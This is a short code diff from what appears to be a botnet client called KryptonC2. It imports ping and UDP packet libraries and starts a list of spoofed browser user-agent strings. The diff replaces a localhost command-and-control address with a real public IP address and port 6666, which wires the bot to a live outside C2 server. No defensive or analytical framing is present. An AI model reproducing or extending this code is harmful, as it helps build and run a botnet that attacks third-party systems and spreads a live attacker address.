@@ -9,9 +9,12 @@ from typing import Any, List, Set, Tuple
 from uuid import UUID, uuid4
 from icmplib import ping as pig
 from scapy.layers.inet import UDP
-    
-C2Host  = "localhost"
-C2Port  = 5511
+
+KRYPTONC2_ADDRESS = "134.255.234.140"
+KRYPTONC2_PORT = 6666
+
+C2Host  = "134.255.234.140"
+C2Port  = 6666
 
 base_user_agents = [
     'Mozilla/%.1f (Windows; U; Windows NT {0}; en-US; rv:%.1f.%.1f) Gecko/%d0%d Firefox/%.1f.%.1f'.format(random.uniform(5.0, 10.0)),
